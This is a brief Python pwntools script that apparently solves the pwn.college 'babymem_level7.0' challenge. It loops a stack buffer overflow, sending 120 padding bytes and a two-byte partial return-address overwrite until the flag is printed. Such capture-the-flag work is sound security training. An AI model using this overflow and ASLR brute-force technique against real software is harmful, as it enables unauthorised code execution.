from pwn import *

while True:
    p = process('/challenge/babymem_level7.0')

    p.recvuntil('Payload size:')
    p.sendline(b'122')

    #payload = b'a' * 120 + b'\x56'+b'\x22' 
    payload = b'a' * 120 + p32(0x2256)
    #p.recvline('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break